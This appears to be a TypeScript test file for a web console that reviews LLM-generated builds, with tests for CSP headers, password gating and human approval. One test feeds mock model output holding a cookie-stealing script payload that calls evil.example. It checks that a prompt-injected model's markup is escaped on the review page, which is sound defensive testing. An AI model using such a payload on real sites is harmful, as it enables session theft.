import { test } from "node:test";
import assert from "node:assert/strict";

import { MockLLMProvider } from "@andromeda/core";
import { createConsoleApp } from "../src/app.ts";
import { createRouter } from "../src/api.ts";
import { escapeHtml } from "../src/views.ts";
import { DEMO_SPEC, demoProvider } from "../src/demo.ts";

const form = (path: string, fields: Record<string, string>) =>
  new Request(`http://console${path}`, {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams(fields).toString(),
  });

const asJson = (path: string, fields: Record<string, string>) =>
  new Request(`http://console${path}`, {
    method: "POST",
    headers: { "content-type": "application/json", accept: "application/json" },
    body: JSON.stringify(fields),
  });

async function consoleUnderTest(llm = demoProvider()) {
  const app = await createConsoleApp({ llm });
  // createConsoleApp only reports demo mode when it supplied the provider
  // itself; these tests always inject one.
  return { app, router: createRouter(app) };
}

test("the dashboard renders with no builds", async () => {
  const { router } = await consoleUnderTest();
  const response = await router.handle(new Request("http://console/"));
  assert.equal(response.status, 200);
  assert.match(response.headers.get("content-type") ?? "", /text\/html/);
  assert.match(await response.text(), /No builds yet/);
});

test("html responses carry a restrictive content security policy", async () => {
  const { router } = await consoleUnderTest();
  const response = await router.handle(new Request("http://console/"));
  const csp = response.headers.get("content-security-policy") ?? "";
  assert.match(csp, /default-src 'none'/);
  // Scripts must be refused outright — 'unsafe-inline' would let a
  // prompt-injected <script> execute if escaping ever regressed.
  assert.match(csp, /script-src 'none'/);
  // 'self', not 'none': the console's own approve/reject forms post back to
  // it, and browsers enforce form-action even though router tests cannot.
  assert.match(csp, /form-action 'self'/);
  assert.equal(response.headers.get("x-content-type-options"), "nosniff");
});

test("a configured password gates every route; without one the console is open", async () => {
  const { app } = await consoleUnderTest();
  const guarded = createRouter(app, { password: "hunter2" });

  for (const request of [
    new Request("http://console/"),
    new Request("http://console/api/runs"),
    form("/runs", { intent: "x", requestedBy: "y" }),
  ]) {
    const denied = await guarded.handle(request);
    assert.equal(denied.status, 401);
    assert.match(denied.headers.get("www-authenticate") ?? "", /Basic/);
  }

  const authed = new Request("http://console/", {
    headers: { authorization: `Basic ${Buffer.from("op:hunter2").toString("base64")}` },
  });
  assert.equal((await guarded.handle(authed)).status, 200);
});

test("a build runs, stops for review, and can be approved through the UI", async () => {
  const { app, router } = await consoleUnderTest();

  const started = await router.handle(
    form("/runs", { intent: "Shorten URLs.", requestedBy: "dana@example.com" }),
  );
  // A browser form post is redirected to the review page.
  assert.equal(started.status, 303);
  const location = started.headers.get("location") ?? "";
  assert.match(location, /^\/runs\//);
  const runId = location.split("/").pop() ?? "";

  const record = await app.runner.get(runId);
  assert.equal(record?.status, "suspended");

  const review = await router.handle(new Request(`http://console${location}`));
  const page = await review.text();
  assert.match(page, /link-shortener/);
  assert.match(page, /Your decision/);
  // The fixture's first attempt fails, so the repair loop is visible.
  assert.match(page, /passed<\/span> after 2 attempt\(s\)/);

  const decided = await router.handle(
    form(`/runs/${runId}/decision`, {
      status: "approved",
      decidedBy: "dana@example.com",
      note: "looks right",
    }),
  );
  assert.equal(decided.status, 303);

  const after = await app.runner.get(runId);
  assert.equal(after?.status, "completed");
  assert.equal((after?.result as { outcome: string }).outcome, "delivered");
});

test("a build awaiting review is identifiable before it has a result", async () => {
  const { router } = await consoleUnderTest();
  await router.handle(asJson("/runs", { intent: "Shorten URLs.", requestedBy: "dana@example.com" }));

  // A suspended run has no return value yet; the reviewer still needs to see
  // what it is without opening it.
  const page = await (await router.handle(new Request("http://console/"))).text();
  assert.match(page, /link-shortener/);
  assert.match(page, /awaiting review/);
});

test("a decision needs a name and a valid status", async () => {
  const { router } = await consoleUnderTest();
  const started = await router.handle(
    asJson("/runs", { intent: "Shorten URLs.", requestedBy: "dana@example.com" }),
  );
  const runId = ((await started.json()) as { id: string }).id;

  const anonymous = await router.handle(
    asJson(`/runs/${runId}/decision`, { status: "approved", decidedBy: "  " }),
  );
  assert.equal(anonymous.status, 400);
  assert.match(JSON.stringify(await anonymous.json()), /needs a name on it/);

  const bogus = await router.handle(
    asJson(`/runs/${runId}/decision`, { status: "maybe", decidedBy: "dana" }),
  );
  assert.equal(bogus.status, 400);
});

test("a build cannot be decided twice", async () => {
  const { router } = await consoleUnderTest();
  const started = await router.handle(
    asJson("/runs", { intent: "Shorten URLs.", requestedBy: "dana@example.com" }),
  );
  const runId = ((await started.json()) as { id: string }).id;

  const first = await router.handle(
    asJson(`/runs/${runId}/decision`, { status: "approved", decidedBy: "dana" }),
  );
  assert.equal(first.status, 200);

  const second = await router.handle(
    asJson(`/runs/${runId}/decision`, { status: "rejected", decidedBy: "someone-else" }),
  );
  assert.equal(second.status, 409);
  assert.match(JSON.stringify(await second.json()), /not awaiting review/);
});

test("starting a build requires an intent and a requester", async () => {
  const { router } = await consoleUnderTest();
  const response = await router.handle(asJson("/runs", { intent: "   ", requestedBy: "" }));
  assert.equal(response.status, 400);
});

test("unknown builds are 404s, not crashes", async () => {
  const { router } = await consoleUnderTest();
  assert.equal((await router.handle(new Request("http://console/runs/nope"))).status, 404);
  assert.equal((await router.handle(new Request("http://console/api/runs/nope"))).status, 404);
});

test("model-authored content cannot inject script into the review page", async () => {
  // A prompt-injected model could put markup in any string it controls. The
  // review page must render it as text.
  const hostile = structuredClone(DEMO_SPEC);
  hostile.summary = '</pre><script>fetch("https://evil.example?c="+document.cookie)</script>';

  const llm = new MockLLMProvider({
    handlers: {
      "spec.compile": [hostile],
      "feature.tests": [
        `import { test } from "node:test";
import assert from "node:assert/strict";
import { handle } from "#features/create-link.ts";
test("ok", async () => {
  assert.equal((await handle({ method: "POST", path: "/x", query: {}, body: {}, userId: null })).status, 401);
});
`,
      ],
      "feature.implement": [
        `import type { FeatureInput, FeatureResult } from "#features/contract.ts";
export async function handle(input: FeatureInput): Promise<FeatureResult> {
  // </pre><script>alert(1)</script>
  if (!input.userId) return { status: 401, body: {} };
  return { status: 201, body: {} };
}
`,
      ],
    },
  });

  const { router } = await consoleUnderTest(llm);
  const started = await router.handle(
    asJson("/runs", { intent: "anything", requestedBy: "dana@example.com" }),
  );
  const runId = ((await started.json()) as { id: string }).id;

  const page = await (await router.handle(new Request(`http://console/runs/${runId}`))).text();
  assert.ok(!page.includes("<script>"), "raw script tag reached the page");
  assert.ok(!page.includes("</pre><script"), "an unescaped break-out reached the page");
  assert.match(page, /&lt;script&gt;/);
});

test("escapeHtml neutralises every character that matters", () => {
  assert.equal(escapeHtml(`<a href="x" title='y'>&</a>`), "&lt;a href=&quot;x&quot; title=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
  assert.equal(escapeHtml(null), "null");
  assert.equal(escapeHtml(42), "42");
});

test("the templates endpoint reports what can actually be built", async () => {
  const { router } = await consoleUnderTest();
  const body = (await (await router.handle(new Request("http://console/api/templates"))).json()) as
    Array<{ id: string; dependencies: Record<string, string> }>;
  assert.deepEqual(body.map((t) => t.id).sort(), ["next-supabase-app", "node-service", "worker-api"]);
  for (const template of body) {
    for (const version of Object.values(template.dependencies)) {
      assert.match(version, /^\d+\.\d+\.\d+/);
    }
  }
});

test("the audit trail is exposed for the run", async () => {
  const { router } = await consoleUnderTest();
  const started = await router.handle(
    asJson("/runs", { intent: "Shorten URLs.", requestedBy: "dana@example.com" }),
  );
  const runId = ((await started.json()) as { id: string }).id;

  const detail = (await (
    await router.handle(new Request(`http://console/api/runs/${runId}`))
  ).json()) as { events: Array<{ kind: string }>; approval: { status: string } };

  assert.ok(detail.events.length > 5);
  assert.ok(detail.events.some((e) => e.kind === "gate.requested"));
  assert.equal(detail.approval.status, "pending");
});
